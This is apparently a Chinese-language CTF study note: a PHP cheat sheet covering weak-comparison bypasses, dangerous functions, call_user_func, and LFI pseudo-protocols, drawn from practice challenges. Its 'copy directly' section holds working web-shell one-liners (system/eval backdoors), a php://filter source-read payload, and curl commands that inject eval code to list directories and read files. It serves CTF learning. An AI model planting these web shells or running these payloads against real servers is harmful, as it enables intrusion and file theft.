# 🗂 Web 笔记 22｜PHP 语法零基础速查（CTF 打题够用版）

> 记录自：qsnctf 实战（TYctf/穿梭隐藏的密钥/变量覆盖系列）｜ 2026-08-13
> 定位：**不需要会写 PHP，只需要认识这些**——看到即识别，翻表即套 payload
> 配套：Web笔记06（PHP 快速入门，更基础的教程向）

---

## 一、读 PHP 代码只需要认识这 8 样（零基础版）

```
<?php ... ?>       PHP 代码块（看到 = 里面是 PHP 代码）
$变量名            变量：$a = 1
$_GET['x']        拿 URL 参数 x（?x=1 → "1"）
$_POST['x']       拿 POST 参数 x
函数名(参数)       执行函数：system("id")
.                  字符串拼接："a"."b" = "ab"
[ ]                数组：$_GET['x']、param1[]=1
-> 和 ::           -> 调对象方法；:: 调静态方法/类常量
```

---

## 二、变量与传参（入口）

| 写法 | 含义 | CTF 用途 |
|---|---|---|
| `$_GET['x']` | 取 URL 参数 | `?x=1` |
| `$_POST['x']` | 取 POST 参数 | POST body 传 |
| `$_REQUEST['x']` | GET+POST 都取 | 两处都能传 |
| `extract($_GET)` | **把 GET 参数变变量**（`?a=1` → `$a=1`） | 变量覆盖！可覆盖 `$token` 等 |
| `$GLOBALS` / `$_COOKIE` | 全局/饼干 | 少见 |

> ⚠️ `extract($_GET)` = 攻击者能塞任意变量名——高危信号（TYctf 题考点①）

---

## 三、比较运算的坑（弱比较家族 ★高频）

```php
==   弱比较：只比值（1 == "1" 真；"abc" == 0 真）
===  强比较：类型+值都相等（防得住）
```

**三种经典绕过**（看到 `哈希() == 哈希()` 就想）：

| 绕过 | 原理 | payload |
|---|---|---|
| **数组** | `sha1(数组)` = null（PHP5.x） | `?param1[]=1&param2[]=2`（null==null） |
| **0e 串** | `"0e123" == 0` 真（科学计数法=0） | 找 `0e` 开头 md5 相等的串（`240610708` 等） |
| **字符串数字** | `"1abc" == 1` 真 | 弱比较只取前导数字 |

> 适用：`md5()` / `sha1()` / 任何 `==` 比较。`===` 时数组绕过依旧有效（PHP5 数组===数组比结构）。

---

## 四、危险函数清单（RCE 全家桶 ★背下来）

| 函数 | 作用 | 例子 | 拦截方式 |
|---|---|---|---|
| `system()` | 执行系统命令（有回显） | `system("id")` | disable_functions 常禁 |
| `exec()` | 执行（无回显） | `exec("id")` | 同上 |
| `shell_exec()` | 执行返回完整输出 | `shell_exec("id")` | 同上 |
| `passthru()` | 执行原始输出 | `passthru("id")` | 同上 |
| `eval()` | **把字符串当 PHP 代码执行** | `eval("phpinfo();")` | 最危险之一 |
| `assert()` | 老版本当 eval 用（PHP7+ 失效） | `assert("phpinfo();")` | 版本坑 |
| `call_user_func()` | 执行「字符串里的函数名」 | `call_user_func("system","id")` | 任意函数调用 |
| `include`/`require` | 包含文件（可执行 PHP） | `include("flag.php")` | LFI 核心 |
| `extract()` | 变量覆盖 | `extract($_GET)` | 覆盖逻辑 |

> **危险函数 = 油门刹车**：看到它们 + 参数用户可控 = 漏洞。

---

## 五、call_user_func 与可变函数（任意调用）

```php
// call_user_func 四种形式
call_user_func("system", "id");        // 普通函数 → system("id")
call_user_func("A::B", $p);            // 静态方法 → A::B($p)（字符串"类名::方法名"）
call_user_func([$obj, "B"], $p);       // 实例方法 → $obj->B($p)（需对象）
call_user_func(["A", "B"], $p);        // 静态方法（数组版）→ A::B($p)

// 可变函数（另一种任意调用）
$_GET['c']($_GET['a']);                // ?c=system&a=id → system("id")
```

> 实例方法不能用字符串 `"A::B"`（没有 $this）；CTF 打实例方法常配合反序列化拿对象。

---

## 六、类与静态方法（认识即可）

```php
class TYctf {
    public $person = 20;               // 属性
    function getNumber(){ ... }        // 普通方法（实例方法，用 -> 调）
    static function getKey(){ ... }    // 静态方法（用 :: 调，无需对象）
}
// 调用：$obj->getNumber()  或  TYctf::getKey()
```

> CTF 里静态方法常藏 `include("flag.php"); echo $flag;` ——配合 call_user_func 打。

---

## 七、include/require 与伪协议（LFI）

```php
include($user_input);        // 用户可控 = LFI（能读文件 + 执行 PHP）
```
伪协议速查：`php://filter`（读源码）、`php://input`（POST 当代码）、`data://`、`file://`、`phar://`（反序列化）→ 详见 Web笔记18。

---

## 八、CTF 常用 payload 模板（直接抄）

```bash
# 命令执行马
<?php system($_GET['c']); ?>
# eval 马
<?php @eval($_POST['x']); ?>
# 弱比较数组绕过
?param1[]=1&param2[]=2
# call_user_func 调静态方法（POST）
-d "payload=类名::方法名"
# 可变函数
?c=system&a=id
# php://filter 读源码
?f=php://filter/read=convert.base64-encode/resource=index.php
```

### eval 环境 · PHP 文件函数示例（qsnctf 40357 实测）

> 场景：**确认 eval 执行后**，用 PHP 原生函数代替 ls/cat（system/shell_exec 常被 disable_functions 禁用）。

```bash
# 列目录：scandir 返回数组 → var_export 打印 → <<< >>> 标记提取
curl -b cookies.txt -G "http://靶机/" \
  --data-urlencode "exp=phpinfo();echo '<<<'.var_export(scandir('/var/www/html'),true).'>>>';"

# 读文件：file_get_contents + @ 防报错
curl -b cookies.txt -G "http://靶机/" \
  --data-urlencode "exp=phpinfo();echo '<<<'.@file_get_contents('/var/www/html/flag.php').'>>>';"
```

拆解（每个零件干嘛的）：
| 零件 | 作用 |
|---|---|
| `phpinfo();` | 白名单前缀——骗过过滤，**后面代码全执行**（eval 环境） |
| `scandir(路径)` | PHP 版 ls，返回文件名**数组** |
| `file_get_contents(路径)` | PHP 版 cat，返回文件内容 |
| `var_export(x, true)` | 把数组打印成可读文本（`true` = 作为返回值） |
| `@` | 文件不存在时**不报错**（不然 warning 刷屏） |
| `'<<<'.xxx.'>>>'` | 输出标记——结果混在 phpinfo 大页面里，搜 `<<<` 一秒定位 |
| `--data-urlencode` | 让 curl 自动编码特殊字符（`;` `'` `<` 不用手写 %XX） |

> 记忆：**eval 环境没有 ls/cat → 列目录用 scandir、读文件用 file_get_contents，前缀 phpinfo(); 负责过过滤。**

---

## 八点五、零门槛最小函数集（CTF 只认这 15 个，不用背）

> 全量 PHP 函数几千个，打题只需要**认识**这 15 个（分 3 组）。看到知道是干嘛的就行，payload 抄第八节。

**① 危险函数（漏洞源头——用户输入能进这些 = 漏洞）**
| 函数 | 干嘛的 | 一句话记 |
|---|---|---|
| `eval(代码)` | 把字符串当 PHP 代码执行 | 输入=程序 |
| `system(命令)` | 执行 Linux 命令并直接输出 | 输入=命令 |
| `exec / shell_exec / passthru` | 执行命令（返回方式不同） | system 的兄弟 |
| `popen(命令,模式)` | 执行命令返回句柄 | 也是命令 |
| `call_user_func(函数名)` | 给函数名就调用 | 任意函数开关 |
| `include(文件)` | 包含文件（读/执行） | LFI 入口 |
| `extract(数组)` | 数组变变量 | 变量覆盖 |

**② 文件操作（RCE 后拿 flag 用，就是 PHP 版 ls/cat）**
| 函数 | 干嘛的 | 对应 Linux |
|---|---|---|
| `scandir(路径)` | 列目录（返回数组） | ls |
| `file_get_contents(路径)` | 读文件内容 | cat |

**③ 辅助（探测/输出/传参）**
| 函数 | 干嘛的 |
|---|---|
| `phpinfo()` | 探路石——存在性高、输出巨大，一眼看出 eval 活没活 |
| `echo` | 输出 |
| `var_export(数组, true)` | 把数组打印成可读文本（true=返回值） |
| `$_GET['x'] / $_POST['x']` | 拿 URL/POST 参数 |

> 记忆口诀：**漏洞看①（输入进危险函数），拿 flag 用②（scandir/file_get_contents），探测回显靠③。**

---

## 九、已打题 → 考点映射（看到就会）

| 题 | PHP 考点 |
|---|---|
| TYctf | extract 变量覆盖 + sha1 弱比较数组 + call_user_func 静态方法 |
| 穿梭隐藏的密钥 | md4 0e 串 + 数组绕过 md5 强比较 |
| 变量变量 eval（CTF-Show） | 可变变量 + eval |
| 反序列化 POP 链 | 魔术方法 + call_user_func |

---

## 十、贴墙速查卡

```
8 符号:  <?php ?> $ $_GET $_POST 函数() . [ ] -> ::
弱比较:  == 比值可绕(数组/0e/数字串)；=== 才防
危险函数: system exec shell_exec passthru eval assert call_user_func include extract
任意调用: call_user_func("A::B") 静态；[$obj,"B"] 实例；可变函数 $c($a)
伪协议:   filter 读源码 input POST代码 data 注入 phar 反序列化
心法:     不需要会写 PHP，认识危险函数+坑，翻表套 payload
```
